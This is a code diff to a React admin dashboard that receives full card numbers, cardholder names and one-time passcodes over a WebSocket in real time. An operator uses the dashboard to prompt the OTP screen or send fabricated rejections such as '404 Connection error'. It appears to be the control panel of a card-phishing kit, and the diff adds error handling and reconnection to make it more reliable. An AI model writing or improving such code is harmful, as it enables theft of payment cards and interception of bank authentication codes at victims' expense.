@@ -37,77 +37,141 @@ const Admin = () => {
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
 
   useEffect(() => {
-    // Connect to WebSocket server
-    const newSocket = io('ws://localhost:3001'); // Replace with your socket server
-    setSocket(newSocket);
+    try {
+      // Connect to WebSocket server with error handling
+      const newSocket = io('ws://localhost:3001', {
+        timeout: 10000,
+        reconnection: true,
+        reconnectionAttempts: 5,
+        reconnectionDelay: 2000
+      });
+      setSocket(newSocket);
 
-    newSocket.on('connect', () => {
-      setIsConnected(true);
-      console.log('Connected to WebSocket server');
-    });
+      newSocket.on('connect', () => {
+        setIsConnected(true);
+        console.log('Connected to WebSocket server');
+      });
 
-    newSocket.on('disconnect', () => {
-      setIsConnected(false);
-      console.log('Disconnected from WebSocket server');
-    });
+      newSocket.on('disconnect', (reason) => {
+        setIsConnected(false);
+        console.log('Disconnected from WebSocket server:', reason);
+      });
 
-    // Listen for new payment data
-    newSocket.on('payment-data', (data: Omit<PaymentData, 'id' | 'status'>) => {
-      const newPayment: PaymentData = {
-        ...data,
-        id: Date.now().toString(),
-        status: 'pending'
+      newSocket.on('connect_error', (error) => {
+        setIsConnected(false);
+        console.error('WebSocket connection error:', error);
+      });
+
+      newSocket.on('reconnect', (attemptNumber) => {
+        setIsConnected(true);
+        console.log('Reconnected to WebSocket server after', attemptNumber, 'attempts');
+      });
+
+      newSocket.on('reconnect_error', (error) => {
+        console.error('WebSocket reconnection error:', error);
+      });
+
+      // Listen for new payment data with error handling
+      newSocket.on('payment-data', (data: Omit<PaymentData, 'id' | 'status'>) => {
+        try {
+          if (!data || !data.cardNumber || !data.cardName) {
+            console.error('Invalid payment data received:', data);
+            return;
+          }
+          
+          const newPayment: PaymentData = {
+            ...data,
+            id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
+            status: 'pending'
+          };
+          setPayments(prev => [newPayment, ...prev]);
+        } catch (error) {
+          console.error('Error processing payment data:', error);
+        }
+      });
+
+      // Listen for OTP submissions with error handling
+      newSocket.on('otp-submitted', (data: { otp: string }) => {
+        try {
+          if (!data || !data.otp) {
+            console.error('Invalid OTP data received:', data);
+            return;
+          }
+          
+          const latestPayment = payments[0];
+          if (latestPayment) {
+            const newOtp: OtpData = {
+              paymentId: latestPayment.id,
+              otp: data.otp,
+              timestamp: new Date().toISOString()
+            };
+            setOtps(prev => [newOtp, ...prev]);
+          }
+        } catch (error) {
+          console.error('Error processing OTP data:', error);
+        }
+      });
+
+      return () => {
+        try {
+          newSocket.disconnect();
+        } catch (error) {
+          console.error('Error disconnecting socket:', error);
+        }
       };
-      setPayments(prev => [newPayment, ...prev]);
-    });
-
-    // Listen for OTP submissions
-    newSocket.on('otp-submitted', (data: { otp: string }) => {
-      const latestPayment = payments[0];
-      if (latestPayment) {
-        const newOtp: OtpData = {
-          paymentId: latestPayment.id,
-          otp: data.otp,
-          timestamp: new Date().toISOString()
-        };
-        setOtps(prev => [newOtp, ...prev]);
-      }
-    });
-
-    return () => {
-      newSocket.disconnect();
-    };
+    } catch (error) {
+      console.error('Error initializing WebSocket connection:', error);
+      setIsConnected(false);
+    }
   }, [payments]);
 
   const handleAction = (paymentId: string, action: string) => {
-    if (!socket) return;
+    try {
+      if (!socket) {
+        console.error('Socket not connected');
+        alert('Connection lost. Please refresh the page.');
+        return;
+      }
 
-    switch (action) {
-      case 'show-otp':
-        socket.emit('show-otp');
-        break;
-      case 'invalid-otp':
-        socket.emit('payment-rejected', 'Invalid OTP');
-        updatePaymentStatus(paymentId, 'rejected');
-        break;
-      case 'invalid-card':
-        socket.emit('payment-rejected', 'Invalid card details');
-        updatePaymentStatus(paymentId, 'rejected');
-        break;
-      case 'incorrect-details':
-        socket.emit('payment-rejected', 'Incorrect card details');
-        updatePaymentStatus(paymentId, 'rejected');
-        break;
-      case 'connection-error':
-        socket.emit('payment-rejected', '404 Connection error');
-        updatePaymentStatus(paymentId, 'rejected');
-        break;
-      case 'successful':
-        socket.emit('payment-approved');
-        updatePaymentStatus(paymentId, 'approved');
-        break;
+      if (!isConnected) {
+        console.error('Socket not connected');
+        alert('Not connected to server. Please wait for reconnection.');
+        return;
+      }
+
+      switch (action) {
+        case 'show-otp':
+          socket.emit('show-otp');
+          break;
+        case 'invalid-otp':
+          socket.emit('payment-rejected', 'Invalid OTP');
+          updatePaymentStatus(paymentId, 'rejected');
+          break;
+        case 'invalid-card':
+          socket.emit('payment-rejected', 'Invalid card details');
+          updatePaymentStatus(paymentId, 'rejected');
+          break;
+        case 'incorrect-details':
+          socket.emit('payment-rejected', 'Incorrect card details');
+          updatePaymentStatus(paymentId, 'rejected');
+          break;
+        case 'connection-error':
+          socket.emit('payment-rejected', '404 Connection error');
+          updatePaymentStatus(paymentId, 'rejected');
+          break;
+        case 'successful':
+          socket.emit('payment-approved');
+          updatePaymentStatus(paymentId, 'approved');
+          break;
+        default:
+          console.error('Unknown action:', action);
+          return;
+      }
+      setActiveDropdown(null);
+    } catch (error) {
+      console.error('Error handling action:', error);
+      alert('An error occurred. Please try again.');
     }
-    setActiveDropdown(null);
   };
 
   const updatePaymentStatus = (paymentId: string, status: 'approved' | 'rejected') => {
@@ -117,7 +181,15 @@ const Admin = () => {
   };
 
   const formatCardNumber = (cardNumber: string) => {
-    return `**** **** **** ${cardNumber.slice(-4)}`;
+    try {
+      if (!cardNumber || cardNumber.length < 4) {
+        return '**** **** **** ****';
+      }
+      return `**** **** **** ${cardNumber.slice(-4)}`;
+    } catch (error) {
+      console.error('Error formatting card number:', error);
+      return '**** **** **** ****';
+    }
   };
 
   const getStatusColor = (status: string) => {
